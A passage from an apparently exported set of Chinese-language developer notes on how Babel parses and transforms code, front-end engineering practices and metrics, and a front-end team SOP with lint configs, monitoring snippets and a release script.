 { type: \"punctuator\", value: \",\" },\n  { type: \"identifier\", value: \"b\" },\n  { type: \"punctuator\", value: \")\" },\n  { type: \"operator\", value: \"=>\" },\n  { type: \"identifier\", value: \"a\" },\n  { type: \"operator\", value: \"+\" },\n  { type: \"identifier\", value: \"b\" }\n]\n```\n\n## 3. 转换（Transform）\n\n   - 遍历（Traverse）：深度优先遍历 AST\n   - 访问（Visitor）：对 AST 节点进行增删改\n   - 应用插件：使用各种 Babel 插件转换代码\n\n这是 AST 的简化示例：\n\n```javascript\n{\n  type: \"Program\",\n  body: [{\n    type: \"VariableDeclaration\",\n    declarations: [{\n      type: \"VariableDeclarator\",\n      id: {\n        type: \"Identifier\",\n        name: \"sum\"\n      },\n      init: {\n        type: \"ArrowFunctionExpression\",\n        params: [\n          {\n            type: \"Identifier\",\n            name: \"a\"\n          },\n          {\n            type: \"Identifier\",\n            name: \"b\"\n          }\n        ],\n        body: {\n          type: \"BinaryExpression\",\n          operator: \"+\",\n          left: {\n            type: \"Identifier\",\n            name: \"a\"\n          },\n          right: {\n            type: \"Identifier\",\n            name: \"b\"\n          }\n        }\n      }\n    }]\n  }]\n}\n```\n\n## 4. 生成（Generate）\n\n   - 根据转换后的 AST 生成新的代码\n   - 处理格式化、空白和注释\n\n转换后的代码可能如下：\n\n```javascript\n\"use strict\";\n\nvar sum = function sum(a, b) {\n  return a + b;\n};\n```\n\n## 5. Babel 插件系统\n\nBabel 的强大之处在于其插件系统：\n\n### 5.1. 语法插件（Syntax Plugins）\n\n- 用于解析特定语法\n- 例如：@babel/plugin-syntax-jsx\n\n### 5.2. 转换插件（Transform Plugins）\n\n- 用于转换特定语法\n- 例如：@babel/plugin-transform-arrow-functions\n\n### 5.3. 预设（Presets）\n\n- 插件集合\n- 常用预设：@babel/preset-env, @babel/preset-react\n\n配置示例\n\n```javascript\n// babel.config.js\nmodule.exports = {\n  presets: [\n    [\"@babel/preset-env\", {\n      targets: {\n        browsers: [\"> 1%\", \"last 2 versions\"]\n      }\n    }]\n  ],\n  plugins: [\n    \"@babel/plugin-transform-arrow-functions\",\n    \"@babel/plugin-transform-runtime\"\n  ]\n}\n```\n\n## 6. 常用包\n\n### 6.1. @babel/parser\n\n这个 API 用于将源代码解析成 AST（抽象语法树）。\n\n```javascript\nconst parser = require('@babel/parser');\n\nconst code = 'const square = (x) => x * x;';\nconst ast = parser.parse(code, {\n  sourceType: 'module',\n  plugins: ['jsx']\n});\n\nconsole.log(ast);\n```\n\n### 6.2. @babel/traverse\n\n这个 API 用于遍历和修改 AST\n\n```javascript\nconst parser = require('@babel/parser');\nconst traverse = require('@babel/traverse').default;\n\nconst code = 'const square = (x) => x * x;';\nconst ast = parser.parse(code);\n\ntraverse(ast, {\n  ArrowFunctionExpression(path) {\n    console.log('Found an arrow function');\n  },\n  Identifier(path) {\n    console.log(`Found identifier: ${path.node.name}`);\n  }\n});\n```\n\n### 6.3. @babel/types\n\n这个 API 提供了用于 AST 节点的类型检查和节点创建的方法。\n\n```javascript\nconst t = require('@babel/types');\n\n// 创建一个标识符节点\nconst identifier = t.identifier('x');\n\n// 创建一个二元表达式节点\nconst binaryExpression = t.binaryExpression('*', identifier, identifier);\n\n// 创建一个箭头函数表达式节点\nconst arrowFunction = t.arrowFunctionExpression(\n  [identifier],\n  binaryExpression\n);\n\nconsole.log(arrowFunction);\n```\n\n### 6.4. @babel/generator\n\n这个 API 用于从 AST 生成代码。\n\n```javascript\nconst parser = require('@babel/parser');\nconst generate = require('@babel/generator').default;\n\nconst code = 'const square = (x) => x * x;';\nconst ast = parser.parse(code);\n\nconst output = generate(ast, {}, code);\nconsole.log(output.code);\n```\n\n### 6.5. @babel/core\n\n这是 Babel 的核心 API，它结合了解析、转换和生成的功能。\n\n```javascript\nconst babel = require('@babel/core');\n\nconst code = 'const square = (x) => x * x;';\n\nbabel.transform(code, {\n  plugins: ['@babel/plugin-transform-arrow-functions']\n}, (err, result) => {\n  if (err) {\n    console.error(err);\n  } else {\n    console.log(result.code);\n  }\n});\n```\n\n### 6.6. 更复杂的例子\n\n示如何使用这些 API 来创建一个简单的 Babel 插件：\n\n这个例子展示了如何创建一个简单的 Babel 插件，将字符串连接操作 (`+`) 转换为 `String.concat()` 方法调用。\n\n````js\n  const parser = require('@babel/parser');\n  const traverse = require('@babel/traverse').default;\n  const generate = require('@babel/generator').default;\n  const t = require('@babel/types');\n\n  // 源代码\n  const code = `\n  function greet(name) {\n    console.log('Hello, ' + name + '!');\n  }\n  `;\n\n  // 解析代码为 AST\n  const ast = parser.parse(code);\n\n  // 遍历 AST 并修改\n  traverse(ast, {\n    BinaryExpression(path) {\n      if (path.node.operator === '+') {\n        path.replaceWith(\n          t.callExpression(\n            t.memberExpression(t.identifier('String'), t.identifier('concat')),\n            path.node.left.type === 'StringLiteral' \n              ? [path.node.left, path.node.right]\n              : [path.node.right, path.node.left]\n          )\n        );\n      }\n    }\n  });\n\n  // 生成新的代码\n  const output = generate(ast, {}, code);\n\n  console.log('转换后的代码:');\n  console.log(output.code);\n````\n\n","aTRrDClP":"\n# Babel  的原理（篇二）\n\n`#babel` \n\n\n## 目录\n<!-- toc -->\n ## 1. 总结 \n\n- 本质是==多叉树的深度遍历==\n\t- 需要注意在==进入节点或者离开节点==时调用相应的钩子\n\t\t- 钩子 `return` 返回\n\t- 为了能够拿到其他节点的信息，所以会单独维护 `context`\n -  常用包\n\t - @babel/core\n\t - @babel/parser\n\t - @babel/traverse\n\t - @babel/generator\n\n## 2. console.log(\"hello world\") 为例\n\n![图片&文件](./files/20241105-22.png)\n\n## 3. Babel 架构\n\n![图片&文件](./files/20241105-23.png)\n\n- @babel/core\n\t- 加载和处理配置(config)\n\t- 加载插件\n\t- 调用 `Parser` 进行语法解析，生成 `AST`\n\t- 调用 `Traverser` 遍历AST，并使用`访问者模式`应用’插件’对 AST 进行转换\n\t- 生成代码，包括SourceMap转换和源代码生成\n- **Parser(`@babel/parser`)**： 将源代码解析为 AST 就靠它了。 它已经内置支持很多语法. \n\t- 例如 JSX、Typescript、Flow、以及最新的ECMAScript规范。\n\t- 目前为了执行效率，parser是[不支持扩展的](https://babeljs.io/docs/en/babel-parser#faq)，由官方进行维护。如果你要支持自定义语法，可以 fork 它，不过这种场景非常少。\n- **Traverser(`@babel/traverse`)**： \n\t- 实现了`访问者模式`，对 AST 进行遍历，`转换插件`会通过它**获取感兴趣的AST节点**，对节点继续操作, 下文会详细介绍`访问器模式`。\n- **Generator(`@babel/generator`)**： 将 AST 转换为源代码，支持 SourceMap\n\n## 4. 访问者模式与上下文\n\n本质是深度遍历，需要注意在进入节点或者离开节点时调用相应的钩子，为了能够拿到其他节点的信息，所以会单独维护 `context`\n\n\n","kRVMrP1X":"\n# 前端工程化\n\n`#前端工程化` \n\n\n## 目录\n<!-- toc -->\n ## 1. 总结 \n\n- 前端工程化的==本质==：\n\t- 通过==工程手段==解决**前端开发中的==效率、规范、质量、性能、安全、监控==等问题**\n\t- 覆盖 ==开发 → 构建 → 部署 → 监控== 全过程\n- 前端工程化==核心目的==是更好的==交付业务==\n- 前端工程化的==好处==：\n\t- 提升研发效率\n\t- 优化研发体验：DX\n\t- 保障项目==质量与安全==\n- 前端工程化的==架构设计==\n\t- 规范化&标准化：\n\t\t- 各类规范，比如 js/css/git/测试 等等\n\t\t\t- 代码规范标准化\n\t\t\t- 工程结构标准化\n\t\t\t- 开发==流程==标准化\n\t- 模块化\n\t\t- 业务模块设计：==分层==\n\t\t\t- 视图层、数据层、服务层、配置层\n\t\t- 服务模块化\n\t\t\t- API 服务\n\t\t\t- 工具服务\n\t- 组件化：\n\t\t- 基础组件 → 业务组件 → 页面 → 应用\n\t- 自动化：==能自动化的都自动化==\n\t\t- 代码提交 → 代码检测 → 自动扫描 → 自动构建 → 单元测试 → 自动化部署 → 自动化测试 → 自动告警监控\n- 质量与安全\n\t- 测试体系：API、UI、关键路径、业务流程\n\t- 代码质量：\n\t\t- eslint sonar prettier \n\t\t- code review 机制\n\t- 安全保证：xss、CSRF 、敏感数据、权限、输入验证等\n- 性能优化\n\t- 核心性能指标\n\t\t- 加载性能：FCP、TTI、LCP\n\t\t- 交互性能：FID、TBT、CLS\n\t- 资源性能：\n\t\t- 首屏 js/css资源大小\n\t\t- 图片压缩率\n\t- 优化策略\n\t\t- 构建层面优化\n\t\t- 运行时优化\n\t\t- 资源加载优化\n- 监控体系\n\t- 性能监控 \n\t- 错误监控\n\t- 用户行为监控\n\t- 业务监控\n\t- 告警反馈机制\n\t- 错误分级标准\n- 开发者体验 DX\n\t- 开发工具链：IDE → 调试 → mock 服务 → 文档 → API 工具\n\t- 前端研发平台等\n\t\t- 集成前端开发全链路\n- ==量化工程化是否好==？\n\t- 构建性能指标\n\t\t- **构建时间**\n\t\t\t- 冷启动完整构建 < 5分钟\n\t\t\t- 增量构建 < 30秒\n\t\t\t- 开发环境热更新 < 300ms\n\t\t- **产物体积**\n\t\t\t- 首屏 JS 体积 < 300KB\n\t\t\t- 首屏 CSS 体积 < 100KB\n\t\t\t- 图片资源压缩率 > 60%\n\t- 部署效率指标\n\t\t- 生产环境部署成功率 > 99%\n\t\t- 回滚时间 < 5分钟\n\t\t- 发布时长\n\t- 代码质量\n\t\t- 圈复杂度 ≤ 10\n\t\t- ==函数行数== ≤ 80行\n\t\t- ==文件行数== ≤ 300行\n\t\t- sonar ==扫描通过率==\n\t\t- ESLint 错误 = 0\n\t\t- TypeScript 类型覆盖率 > 90%\n\t\t- 代码注释率：15-20%\n\t\t- 单元测试\n\t\t\t- 测试覆盖率 > 80%\n\t\t\t- 核心业务覆盖率 > 90%\n\t\t\t- 测试用例通过率 100%\n\t- 运行时性能\n\t\t- 长任务(>50ms) < 5%\n\t\t- 内存泄漏 = 0\n\t\t- FPS > 50fps\n\t\t- FCP (First Contentful Paint) < 1.5s\n\t\t- LCP (Largest Contentful Paint) < 2.5s\n\t\t- TTI (Time to Interactive) < 3.5s\n\t\t- 内存使用\n\t\t- CPU 使用率\n\t\t- 资源缓存命中率\n\t\t- 是否有服务降级机制\n- API 接口性能\n\t- P95 响应时间 < 500ms\n\t- 接口成功率 > 99.9%\n\t- 接口错误率 < 0.1%\n- 研发效率指标\n\t- 通用组件复用率 > 80%\n\t- 工具函数复用率 > 60%\n- 开发效率\n\t- ==需求按期交付率== > 90%\n\t- 迭代速度？\n\t\t- 双周迭代 → 周迭代？\n\t- 缺陷修复周期 < 24小时\n\t\t- 不同级别的 Bug ==修复周期==不一样\n\t- 代码提交频率 > 3次/天\n- 自动化程度\n\t- 关键环节是否都自动化了？\n\t- 环境隔离度\n\t- 自动化工具覆盖率\n- 规范化程度\n\t- 命名规范遵守率\n\t- Git 提交规范\n- 安全\n\t- 安全漏洞修复时长\n\t- 定期安全扫描机制\n- 内部系统集成率\n- 告警系统\n\t- ==线上问题发现率==\n\t- 日志体系完备性\n\t- 开发环境一致性\n\n\n\n> 另外见 [2. 前端工程化 SOP](/post/GWG7k34s.html)\n\n## 2. 前端工程化的本质\n\n- 前端工程化的本质是通过==工程手段==解决**前端开发中的效率、规范、质量、性能、安全、监控等问题**。\n\t- 它不仅仅是工具的堆砌，而是一套完整的**系统工程方法论**\n\t- 它涉及**开发、构建、部署、运维**等多个环节\n\n## 3. 核心目标\n\n==核心目的==：**更好高效的的交付业务** \n\n### 3.1. **提升开发效率**\n\n![图片&文件](./files/20241028-6.png)\n\n### 3.2. **保证项目质量**\n\n```typescript\n// 质量保证体系示例\ninterface QualitySystem {\n  static: {\n    eslint: ESLintConfig;\n    typescript: TSConfig;\n    prettier: PrettierConfig;\n  };\n  runtime: {\n    errorBoundary: ErrorBoundaryConfig;\n    monitoring: MonitoringConfig;\n    testing: TestingStrategy;\n  };\n  process: {\n    review: CodeReviewProcess;\n    ci: ContinuousIntegration;\n    deployment: DeploymentStrategy;\n  }\n}\n```\n\n### 3.3. **优化研发体验**\n\n   - 开发工具链集成\n   - 即时反馈机制\n   - 开发环境标准化\n   - 调试工具完善\n\n## 4. 工程化架构设计\n\n### 4.1. **基础设施层**\n\n覆盖 ==开发 → 构建→ CI → 监控==\n\n````ts\ninterface Infrastructure {\n  // 构建系统\n  build: {\n    dev: () => void;      // 开发环境构建\n    prod: () => void;     // 生产环境构建\n    analyze: () => void;  // 构建分析\n  };\n  \n  // 开发工具\n  devTools: {\n    lint: () => void;     // 代码检查\n    format: () => void;   // 代码格式化\n    debug: () => void;    // 调试工具\n  };\n  \n  // 持续集成\n  ci: {\n    test: () => void;     // 自动化测试\n    build: () => void;    // 自动化构建\n    deploy: () => void;   // 自动化部署\n  };\n  \n  // 监控系统\n  monitoring: {\n    performance: () => void; // 性能监控\n    error: () => void;      // 错误监控\n    business: () => void;   // 业务监控\n  };\n}\n````\n\n### 4.2. 规范标准层（标准化）\n\n- 代码规范标准化\n- 工程结构标准化\n- 开发流程标准化\n\n```yaml\nstandards:\n  code:\n    - JavaScript/TypeScript规范\n    - CSS/Sass规范\n    - 目录结构规范\n  development:\n    - Git工作流规范\n    - 开发流程规范\n    - 测试规范\n  architecture:\n    - 项目架构规范\n    - 组件设计规范\n    - API设计规范\n```\n\n### 4.3. 工具支持层\n\n   - 脚手架工具\n   - 构建工具\n\t   - （Webpack/Vite）\n   - 测试工具\n\t   - （Jest/Cypress）\n   - 部署工具\n\n## 5. 工程化实践要素\n\n### 5.1. **模块化设计**\n\n- 组件模块化\n- ==状态数据==模块化\n- 服务模块化\n\t- API 服务封装\n\t- 工具服务封装\n\t- 业务逻辑服务封装\n\n````ts\n  // 业务模块设计\n  interface ModuleStructure {\n    // 视图层\n    views: {\n      components: React.Component[];\n      layouts: Layout[];\n      pages: Page[];\n    };\n    \n    // 数据层\n    models: {\n      states: State[];\n      actions: Action[];\n      reducers: Reducer[];\n    };\n    \n    // 服务层\n    services: {\n      api: APIService;\n      utils: Utilities;\n      helpers: Helpers;\n    };\n    \n    // 配置层\n    configs: {\n      routes: Route[];\n      constants: Constants;\n      settings: Settings;\n    };\n  }\n````\n\n### 5.2. **组件化开发**\n\n```typescript\n// 组件分层示例\ninterface ComponentLayers {\n  // 基础组件层\n  basic: {\n    Button: ButtonComponent;\n    Input: InputComponent;\n    // ...\n  };\n  \n  // 业务组件层\n  business: {\n    UserCard: UserCardComponent;\n    OrderList: OrderListComponent;\n    // ...\n  };\n  \n  // 页面组件层\n  pages: {\n    UserCenter: UserCenterPage;\n    OrderManagement: OrderManagementPage;\n    // ...\n  };\n}\n```\n\n### 5.3. **自动化流程**\n\n![图片&文件](./files/20241028-7.png)\n\n- 构建自动化\n- 测试自动化\n- 部署自动化\n\t- CI/CD流程\n\t- 自动化测试\n\t- 自动化部署\n- 监控告警自动化\n\n> 单元测试，其实做的团队不多\n\n## 6. 质量保证体系\n\n### 6.1. **测试体系**\n\n```typescript\n// 测试策略\ninterface TestingStrategy {\n  unit: {\n    framework: 'Jest';\n    coverage: {\n      statements: 80;\n      branches: 70;\n      functions: 80;\n      lines: 80;\n    };\n  };\n  \n  integration: {\n    framework: 'Cypress';\n    scope: ['API', 'UI'];\n  };\n  \n  e2e: {\n    framework: 'Playwright';\n    scenarios: ['关键路径', '业务流程'];\n  };\n}\n```\n\n### 6.2. **代码质量控制**\n\n   - ESLint 配置\n   - **sonar 检测集成**\n   - TypeScript 类型检查\n   - Prettier 格式化\n   - Code Review 机制\n\t   - 主动发起 \n\t   - Code review\n\t   - Review 机制\n\t\t   - **定期一起 review 代码**\n\n## 7. 性能优化体系\n\n### 7.1. **性能指标**\n\n核心性能指标\n\n加载性能\n\n  - FCP (First Contentful Paint) < 1.8s\n  - LCP (Largest Contentful Paint) < 2.5s\n  - TTI (Time to Interactive) < 3.8s\n\n交互性能\n\n  - FID (First Input Delay) < 100ms\n  - TBT (Total Blocking Time) < 200ms\n  - CLS (Cumulative Layout Shift) < 0.1\n\n### 7.2. 资源性能\n\n  - 首屏 JS 资源 < 300 KB\n  - 首屏 CSS 资源 < 100 KB\n  - **图片资源优化&压缩率** > 70%\n\n### 7.3. **优化策略**\n\n- ==构建==层面优化\n\t- 代码分割\n\t- 树摇优化\n\t- 资源压缩\n\t- 缓存策略\n- ==运行时==优化\n\t- 渲染优化\n- ==资源加载==优化\n\t- 懒加载\n\t- 预加载\n\t- 并行加载\n\t- 资源合并\n\n## 8. 安全保障体系\n\n### 8.1. **安全策略**\n\n```typescript\ninterface SecurityStrategy {\n  // XSS防护\n  xss: {\n    contentSecurityPolicy: CSPConfig;\n    sanitization: SanitizeConfig;\n  };\n  \n  // CSRF防护\n  csrf: {\n    tokenValidation: TokenConfig;\n    headerChecks: HeaderConfig;\n  };\n  \n  // 数据安全\n  data: {\n    encryption: EncryptionConfig;\n    storage: StorageConfig;\n  };\n}\n```\n\n### 8.2. **安全实践**\n\n   - 输入验证\n   - 权限控制\n   - 敏感数据处理\n   - 安全审计 \n\n## 9. 持续优化\n\n### 9.1. **监控体系**\n\n![图片&文件](./files/20241028-9.png)\n\n![图片&文件](./files/20241028-8.png)\n\n### 9.2. 日志系统\n\n### 9.3. **反馈机制**\n\n   - 性能监控\n   - 错误追踪\n   - 用户反馈\n   - 系统日志\n\n## 10. 开发者体验\n\n良好的开发体验可以提高团队效率：\n- **开发工具链**\n\t- IDE 配置\n\t- 调试工具\n\t- 开发 服务器\n\t- Mock 服务\n- 文档工具等\n- **前端研发平台**\n\n## 11. 工程化成熟度评估\n\n### 11.1. **评估维度**\n\n```typescript\ninterface MaturityAssessment {\n  process: {\n    automation: number;  // 自动化程度\n    standardization: number;  // 规范化程度\n    efficiency: number;  // 效率提升\n  };\n  \n  quality: {\n    codeQuality: number;  // 代码质量\n    testCoverage: number;  // 测试覆盖\n    performance: number;  // 性能指标\n  };\n  \n  maintenance: {\n    documentation: number;  // 文档完整性\n    codeReusability: number;  // 代码复用性\n    scalability: number;  // 可扩展性\n  };\n}\n```\n\n### 11.2. **优化方向**\n\n   - 工具链优化\n   - 流程优化\n   - 规范完善\n   - 技术升级\n\n## 12. 总结\n\n- 前端工程化是一个**持续演进的过程**，需要根据==团队和项目的实际情况==，选择合适的工程化策略和工具\n- 好的工程化体系应该是\n\t- 能够支撑业务快速发展\n\t- 提高团队开发效率\n\t- 保证项目质量的完整解决方案\n- 需要持续关注工程化领域的新技术和最佳实践，不断完善和优化工程化体系，\n- 也要注意**平衡工程化投入与收益**，避免过度工程化带来的负担\n\n","GWG7k34s":"\n# 前端工程化 SOP\n\n`#前端工程化`  \n\n\n## 目录\n<!-- toc -->\n ## 1. 总结 \n\n- 规范与流程\n\t- 技术栈选型：\n\t\t- 框架、构建工具、css框架、状态管理等\n\t- 项目结构目录规范\n\t\t- 知道在哪里改\n\t- 代码规范\n\t\t- eslint\n\t\t- prettierrc\n\t- 流程规范\n\t\t- git 工作流\n\t\t- git 提交规范\n\t\t- 版本规范\n\t- 组件开发规范\n\t- 状态管理规范\n\t- 构建与部署规范\n\t\t- 构建配置：抽象出来，脚手架\n\t\t- 环境配置\n\t\t- ci/cd\n- 质量保障\n\t- 测试规范\n\t- 性能优化：\n\t\t- 各类指标\n\t\t- 加载性能\n\t\t- 内存使用情况\n\t- 用户体验\n\t\t- 边界错误处理\n\t\t- 加载状态\n\t\t- 响应式设计\n- ==清单==\n\t- 优化清单\n\t\t- 加载 → 渲染优化 → 构建优化 \n\t\t- 检测各种优化手段是否上了\n\t- 发布清单 → ==需要严格执行==\n\t\t-  ==发布前==检查\n\t\t\t- [ ] 所有测试通过\n\t\t\t- [ ] 代码审查完成\n\t\t\t- [ ] 性能指标达标\n\t\t\t- [ ] 文档更新完成\n\t\t\t- [ ] ==前后端服务依赖关系==\n\t\t  - 发布步骤\n\t\t\t1. 更新版本号\n\t\t\t2. 生成更新日志 →  是否自动生成\n\t\t\t3. 构建生产包\n\t\t\t4. 执行部署脚本\n\t\t\t5. 验证部署结果\n\t\t  - ==发布后==确认\n\t\t\t- [ ] 功能验证\n\t\t\t- [ ] 监控正常\n\t\t\t- [ ] 备份确认\n\t- 代码审查==清单==\n\t\t- 功能性\n\t\t\t- [ ] 功能是否完整实现\n\t\t\t- [ ] 边界条件是否处理\n\t\t\t- [ ] 错误处理是否完善\n\t\t- 代码质量\n\t\t\t- [ ] 代码风格符合规范\n\t\t\t- [ ] 命名是否合理\n\t\t\t- [ ] 是否有重复代码\n\t\t\t- [ ] TypeScript 类型完整性\n\t\t\t- [ ]  单元测试覆盖率\n\t\t\t- [ ]  代码复杂度检查\n\t\t\t- [ ]  性能指标达标\n\t\t- 性能\n\t\t\t- [ ] 是否有性能隐患\n\t\t\t- [ ] 资源使用是否合理\n\t\t- 安全性\n\t\t\t- [ ] 依赖包安全审查\n\t\t\t- [ ] XSS 防护\n\t\t\t- [ ] CSRF 防护\n\t\t\t- [ ] 是否有安全漏洞\n\t\t\t- [ ] 敏感信息是否加密\n\t\t- 可维护性\n\t\t\t- [ ] 代码是否易于理解\n\t\t\t- [ ] 注释是否充分\n\t\t\t- [ ] 是否遵循设计模式\n\t\t- **工程规范**\n\t\t\t- [ ]  Git提交规范\n\t\t\t- [ ]  代码审查流程\n\t\t\t- [ ]  文档完整性\n\t\t\t- [ ]  构建流程稳定性\n- 前端开发全链路\n\t- 项目初始化 → dev → 联调 → 埋点 → 构建发布 → 性能监控等\n\t- 每个环节减少人肉，尽量工具化，自动化，关键动作加==卡点==\n\t\t- 比如 git 提交动作\n\t\t- 构建发布\n- 要确保团队成员==都理解并遵循这些规范==\n\t- 宣讲、文档化、定期更新等\n\n## 2. 项目初始化与规范制定\n\n### 2.1. **技术栈选型**\n\n   ```javascript\n   // 示例技术栈配置\n   {\n     \"frontend\": {\n       \"framework\": \"React/Vue/Angular\",\n       \"buildTool\": \"Vite/Webpack\",\n       \"cssFramework\": \"TailwindCSS/SCSS\",\n       \"stateManagement\": \"Redux/Vuex/Pinia\"\n     }\n   }\n   ```\n\n### 2.2. **项目结构规范**\n\n```bash\nsrc/\n├── assets/          # 静态资源\n├── components/      # 公共组件\n│   ├── basic/      # 基础组件\n│   └── business/   # 业务组件\n├── hooks/          # 自定义 hooks\n├── pages/          # 页面组件\n├── services/       # API 服务\n├── store/          # 状态管理\n├── styles/         # 样式文件\n├── types/          # TypeScript 类型\n└── utils/          # 工具函数\n````\n\n### 2.3. **代码规范配置**\n\n```javascript hl:1,13\n// .eslintrc.js\nmodule.exports = {\n  extends: [\n    'eslint:recommended',\n    'plugin:@typescript-eslint/recommended',\n    'prettier'\n  ],\n  rules: {\n    // 项目特定规则\n  }\n};\n\n// .prettierrc\n{\n  \"semi\": true,\n  \"singleQuote\": true,\n  \"tabWidth\": 2,\n  \"printWidth\": 80\n}\n```\n\n## 3. 开发流程规范\n\n### 3.1. **Git 工作流规范**\n\n### 3.2. **提交信息规范**\n\n### 3.3. **版本管理规范**\n\n```json\n{\n  \"version\": \"1.2.3\",\n  \"versionStrategy\": {\n    \"major\": \"重大更新，不兼容的 API 修改\",\n    \"minor\": \"新功能，向下兼容\",\n    \"patch\": \"问题修复，向下兼容\"\n  }\n}\n```\n\n## 4. 组件开发规范\n\n### 4.1. **组件设计原则**\n\n- 组件开发规范\n- 组件文档示例\n\n```javascript\n// 标准组件结构\ninterface Props {\n  // 明确的类型定义\n  data: UserData;\n  onAction: (id: string) => void;\n}\n\nconst Component: React.FC<Props> = ({ data, onAction }) => {\n  // 1. Hooks声明\n  const [state, setState] = useState();\n  \n  // 2. 业务逻辑处理\n  const handleClick = useCallback(() => {\n    // 处理逻辑\n  }, []);\n  \n  // 3. 渲染逻辑\n  return (\n    <div>\n      {/* JSX结构 */}\n    </div>\n  );\n};\n\n// 导出\nexport default memo(Component);\n```\n\n### 4.2. **状态管理规范** \n\n## 5. 构建与部署规范\n\n### 5.1. **构建配置**\n\n### 5.2. **环境配置**\n\n### 5.3. **CI/CD 配置**\n\n## 6. 测试规范\n\n### 6.1. **单元测试**\n\n### 6.2. **集成测试规范**\n\n## 7. 性能优化规范\n\n### 7.1. **性能指标**\n\n```javascript\n// 性能监控配置\n{\n  \"metrics\": {\n    \"FCP\": \"First Contentful Paint < 1.8s\",\n    \"LCP\": \"Largest Contentful Paint < 2.5s\",\n    \"FID\": \"First Input Delay < 100ms\",\n    \"CLS\": \"Cumulative Layout Shift < 0.1\"\n  }\n}\n```\n\n1. **性能监控**\n    - 首屏加载时间\n    - 交互响应时间\n    - 资源加载性能\n    - 内存使用情况\n2. **用户体验优化**\n    - 加载状态处理\n    - 错误边界处理\n    - 响应式设计\n    - 可访问性优化\n\n### 7.2. **优化清单**\n\n  - 加载优化\n\t  - 路由懒加载\n\t  - 图片懒加载\n\t  - 代码分割\n\t  - 资源预加载\n  - 渲染优化\n\t  - 虚拟列表\n\t  - 防抖节流\n\t  - 组件缓存\n- 构建优化\n\t- Tree Shaking\n\t- 压缩资源\n\t- 缓存策略\n\t- CDN 部署\n\n## 8. 文档规范\n\n### 8.1. **代码注释规范**\n\n```typescript\n/**\n * @function formatDate\n * @description 格式化日期\n * @param {Date} date - 要格式化的日期\n * @param {string} [format='YYYY-MM-DD'] - 日期格式\n * @returns {string} 格式化后的日期字符串\n * @example\n * formatDate(new Date(), 'YYYY/MM/DD')\n */\n```\n\n### 8.2. **API 文档规范**\n\n## 9. 监控与日志规范（质量保证体系）\n\n### 9.1. **错误监控**\n\n```typescript\n// 错误监控配置\nwindow.onerror = function(message, source, lineno, colno, error) {\n  // 上报错误信息\n  reportError({\n    type: 'javascript',\n    message,\n    source,\n    lineno,\n    colno,\n    error: error?.stack\n  });\n};\n\n// React 错误边界\nclass ErrorBoundary extends React.Component {\n  componentDidCatch(error, errorInfo) {\n    // 上报错误信息\n    reportError({\n      type: 'react',\n      error,\n      errorInfo\n    });\n  }\n}\n\n// 监控配置示例\nconst monitor = {\n  error: (error: Error) => {\n    // 错误上报\n    errorTracker.capture(error);\n    // 日志记录\n    logger.error(error);\n  },\n  \n  performance: (metrics: PerformanceMetrics) => {\n    // 性能指标上报\n    performanceTracker.track(metrics);\n  }\n};\n\n```\n\n### 9.2. **性能监控**\n\n```typescript hl:2\n// 性能监控实现\nconst performanceObserver = new PerformanceObserver((list) => {\n  const entries = list.getEntries();\n  entries.forEach((entry) => {\n    // 上报性能指标\n    reportPerformance({\n      name: entry.name,\n      value: entry.startTime,\n      type: entry.entryType\n    });\n  });\n});\n\nperformanceObserver.observe({ entryTypes: ['paint', 'largest-contentful-paint'] });\n```\n\n## 10. 发布流程规范\n\n### 10.1. **发布清单**\n\n  - 发布前检查\n\t- [ ] 所有测试通过\n\t- [ ] 代码审查完成\n\t- [ ] 性能指标达标\n\t- [ ] 文档更新完成\n  - 发布步骤\n\t1. 更新版本号\n\t2. 生成更新日志\n\t3. 构建生产包\n\t4. 执行部署脚本\n\t5. 验证部署结果\n  - 发布后确认\n\t- [ ] 功能验证\n\t- [ ] 监控正常\n\t- [ ] 备份确认\n\n### 10.2. **版本发布脚本**\n\n```bash hl:7\n`#!/bin/bash`\n# release.sh\n\n# 更新版本号\nnpm version patch\n\n# 生成更新日志\nconventional-changelog -p angular -i CHANGELOG.md -s\n\n# 构建\nnpm run build\n\n# 部署\nnpm run deploy\n```\n\n## 11. 团队协作规范\n\n### 11.1. **代码审查清单**\n\n  - 代码审查要点\n\t  - 功能性\n\t\t  - [ ] 功能是否完整实现\n\t\t  - [ ] 边界条件是否处理\n\t\t  - [ ] 错误处理是否完善\n\t  - 代码质量\n\t\t  - [ ] 代码风格符合规范\n\t\t  - [ ] 命名是否合理\n\t\t  - [ ] 是否有重复代码\n\t\t  - [ ] TypeScript 类型完整性\n\t    - [ ]  单元测试覆盖率\n\t    - [ ]  代码复杂度检查\n\t    - [ ]  性能指标达标\n\t  - 性能\n\t\t  - [ ] 是否有性能隐患\n\t\t  - [ ] 资源使用是否合理\n\t  - 安全性\n\t\t  - [ ] 依赖包安全审查\n\t\t  - [ ] XSS 防护\n\t\t  - [ ] CSRF 防护\n\t\t  - [ ] 是否有安全漏洞\n\t\t  - [ ] 敏感信息是否加密\n\t  - 可维护性\n\t\t  - [ ] 代码是否易于理解\n\t\t  - [ ] 注释是否充分\n\t\t  - [ ] 是否遵循设计模式\n\t- **工程规范**\n\t    - [ ]  Git提交规范\n\t    - [ ]  代码审查流程\n\t    - [ ]  文档完整性\n\t    - [ ]  构建流程稳定性\n\n### 11.2. **团队协作工具配置**\n\n```json\n{\n  \"husky\": {\n    \"hooks\": {\n      \"pre-commit\": \"lint-staged\",\n      \"commit-msg\": \"commitlint -E HUSKY_GIT_PARAMS\"\n    }\n  },\n  \"lint-staged\": {\n    \"*.{js,jsx,ts,tsx}\": [\n      \"eslint --fix\",\n      \"prettier --write\"\n    ]\n  }\n}\n```\n\n## 12. 工程化工具链\n\n1. **开发工具**\n    - VS Code + 插件配置\n    - Chrome DevTools\n    - Postman / Insomnia\n2. **自动化工具**\n    - CI/CD：Jenkins/GitHub Actions\n    - 自动化测试：Jest/Cypress\n    - 代码分析：SonarQube\n\n## 13. 最后\n\n这个 SOP 涵盖了前端工程化的主要方面，可以根据具体项目需求进行调整和扩展。\n\n关键是要确保团队成员都理解并遵循这些规范，持续改进工程化流程。建议将**这些规范文档化，并定期更新和优化**。\n\n- 先梳理好我们自己的东西，比如`整个研发生命周期流程`链路；\n- 然后在流程里`找可优化的点`，并去调研或者看社区有没有能借力的，看是否需要二次开发\n\n\n![720](#)","KoyUHTbD":"\n# DevOps 开源项目\n\n`#devops`\n\n\n## 目录\n<!-- toc -->\n ## 1. 总结 \n\n- CI&CD 工具\n\t- Jenkins\n\t- GitLab CI\n\t- DroneCI\n- 监控与日志\n\t- Prometheus\n\t- Grafana\n\t- ELK Stack\n\t\t- Elasticsearch\n\t\t- 